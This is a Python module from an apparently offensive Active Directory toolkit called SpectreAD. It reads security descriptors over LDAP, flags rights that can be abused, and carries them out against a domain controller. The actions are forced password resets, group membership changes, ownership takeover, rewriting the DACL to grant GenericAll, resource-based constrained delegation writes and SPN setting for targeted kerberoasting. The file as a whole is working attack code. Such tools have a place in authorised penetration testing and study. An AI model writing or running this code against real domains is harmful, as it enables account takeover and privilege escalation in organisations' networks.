"""
SpectreAD :: core/acl.py
ACE enumeration and edge abuse.

Author : Inayat Hussain
"""

from __future__ import annotations

from core import ui
from core.creds import resolve
from core.store import open_store

EXT_RIGHTS = {
    "00299570-246d-11d0-a768-00aa006e0529": "ForceChangePassword",
    "bf9679c0-0de6-11d0-a285-00aa003049e2": "AddMember",
    "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "AllowedToAct",
    "5b47d60f-6090-40b2-9f37-2a4de88f3063": "AddKeyCredentialLink",
}
MASK = {
    0x10000000: "GenericAll",
    0x40000000: "GenericWrite",
    0x00040000: "WriteDACL",
    0x00080000: "WriteOwner",
    0x00000020: "WriteProperty",
}
ABUSABLE = {"GenericAll", "WriteDACL", "WriteOwner", "ForceChangePassword",
            "AddMember", "AllowedToAct", "AddKeyCredentialLink"}


def enumerate_aces(args) -> None:
    from impacket.ldap import ldaptypes
    from impacket.ldap.security_descriptor_control import SecurityDescriptorControl

    from core.ldap import _paged, base_dn, connect

    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn = connect(args.dc_ip or args.target, cred)
        root = base_dn(conn, args.domain)

        flt = ("(|(objectClass=user)(objectClass=group)(objectClass=computer)"
               "(objectClass=organizationalUnit)(objectClass=domainDNS))")
        entries = _paged(conn, root, flt,
                         ["sAMAccountName", "distinguishedName", "nTSecurityDescriptor"])
        ui.info(f"parsing {len(entries)} security descriptor(s)")

        with store.batch():
            for e in entries:
                target = str(e["sAMAccountName"] or e["distinguishedName"])
                raw = e["nTSecurityDescriptor"].raw_values
                if not raw:
                    continue
                try:
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw[0])
                except Exception:
                    continue
                for ace in sd["Dacl"]["Data"]:
                    if ace["AceType"] != 0x00:
                        continue
                    sid = ace["Ace"]["Sid"].formatCanonical()
                    mask = ace["Ace"]["Mask"]["Mask"]
                    edges = {n for bit, n in MASK.items() if mask & bit}
                    if ace["Ace"].has_key("ObjectType") and ace["Ace"]["ObjectType"]:
                        guid = str(ace["Ace"]["ObjectType"]).lower()
                        if guid in EXT_RIGHTS:
                            edges.add(EXT_RIGHTS[guid])
                    for edge_name in edges:
                        store.add_ace(sid, edge_name, target)
                        if edge_name in ABUSABLE:
                            ui.finding("high", f"{sid} --[{edge_name}]--> {target}", "abusable")

        ui.ok(f"{len(store.aces())} abusable edge(s) cached")
        store.log("acl", "complete", args.domain, f"{len(store.aces())} edges")


def abuse(args) -> None:
    from impacket.ldap import ldaptypes

    from core.ldap import connect, base_dn, find_object

    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn = connect(args.dc_ip, cred)
        root = base_dn(conn, args.domain)

        tgt = find_object(conn, root, args.target)
        src = find_object(conn, root, args.source)
        if tgt is None:
            ui.die(f"target not found: {args.target}")
        if src is None:
            ui.die(f"source not found: {args.source}")

        tdn = str(tgt["distinguishedName"])
        ssid = src["objectSid"].raw_values[0]

        ui.edge(f"{args.edge or args.action}: {args.source} -> {tdn}")
        if args.dry_run:
            ui.info("dry run — nothing changed")
            return

        action = args.action
        if not action:
            if args.edge == "ForceChangePassword":
                action = "forcechange"
            elif args.edge == "AddMember":
                action = "addmember"
            elif args.edge == "WriteOwner":
                action = "writeowner"
            elif args.edge == "WriteDACL":
                action = "writedacl"
            elif args.edge == "AllowedToAct":
                action = "rbcd"
            elif args.edge == "AddKeyCredentialLink":
                action = "shadowcred"
            else:
                action = "forcechange"

        if action == "forcechange":
            _force_change(conn, tdn, args.new_password)
        elif action == "addmember":
            _add_member(conn, tdn, str(src["distinguishedName"]))
        elif action == "writeowner":
            _write_owner(conn, tdn, ssid)
        elif action == "writedacl":
            _write_dacl(conn, tdn, ssid)
        elif action == "setspn":
            _set_spn(conn, tdn)
        elif action == "rbcd":
            _rbcd(conn, tdn, ssid)
        elif action == "shadowcred":
            ui.warn("run: certipy-ad shadow auto -account <target> -dc-ip <dc>")
        else:
            ui.warn(f"no handler for {action}")

        store.log("abuse", args.edge, f"{args.source}->{args.target}", action)


def _force_change(conn, dn, new_password: str) -> None:
    conn.modify(dn, {"unicodePwd": [(2, f'"{new_password}"'.encode("utf-16-le"))]})
    ui.ok(f"password set to {new_password}") if conn.result["result"] == 0 \
        else ui.fail(conn.result.get("message", "failed"))


def _add_member(conn, dn, member_dn: str) -> None:
    conn.modify(dn, {"member": [(0, member_dn)]})
    ui.ok(f"added {member_dn}") if conn.result["result"] == 0 \
        else ui.fail(conn.result.get("message", "failed"))


def _write_owner(conn, dn, sid: bytes) -> None:
    conn.modify(dn, {"owner": [(2, sid)]})
    ui.ok("ownership taken") if conn.result["result"] == 0 \
        else ui.fail(conn.result.get("message", "failed"))


def _sd_with_generic_all(sid_bytes: bytes) -> bytes:
    from impacket.ldap import ldaptypes

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 0x8004
    sd["OffsetOwner"] = b"\x00\x00\x00\x00"
    sd["OffsetGroup"] = b"\x00\x00\x00\x00"
    sd["OffsetSacl"] = b"\x00\x00\x00\x00"
    sd["OffsetDacl"] = b"\x00\x00\x00\x00"
    sd["OwnerSid"] = None
    sd["GroupSid"] = None
    sd["Sacl"] = None

    dacl = ldaptypes.ACL()
    dacl["AclRevision"] = 4
    dacl["Sbz1"] = 0
    dacl["Sbz2"] = 0
    dacl["Dacl"] = ldaptypes.DACL()

    ace = ldaptypes.ACE()
    ace["AceType"] = 0x00
    ace["AceFlags"] = 0x00
    body = ldaptypes.ACCESS_ALLOWED_ACE()
    body["Mask"] = ldaptypes.ACCESS_MASK()
    body["Mask"]["Mask"] = 0x10000000
    body["Sid"] = ldaptypes.SID(sid_bytes)
    ace["Ace"] = body
    dacl["Dacl"].append(ace)
    sd["Dacl"] = dacl
    return sd.getData()


def _write_dacl(conn, dn, sid: bytes) -> None:
    conn.modify(dn, {"nTSecurityDescriptor": [(2, _sd_with_generic_all(sid))]})
    ui.ok("GenericAll granted") if conn.result["result"] == 0 \
        else ui.fail(conn.result.get("message", "failed"))


def _rbcd(conn, dn, sid: bytes) -> None:
    conn.modify(dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity":
                     [(2, _sd_with_generic_all(sid))]})
    ui.ok("RBCD written — run: s4u") if conn.result["result"] == 0 \
        else ui.fail(conn.result.get("message", "failed"))


def _set_spn(conn, dn) -> None:
    conn.modify(dn, {"servicePrincipalName": [(0, "spectread/targeted")]})
    ui.ok("SPN set — run: kerb (targeted kerberoast)")
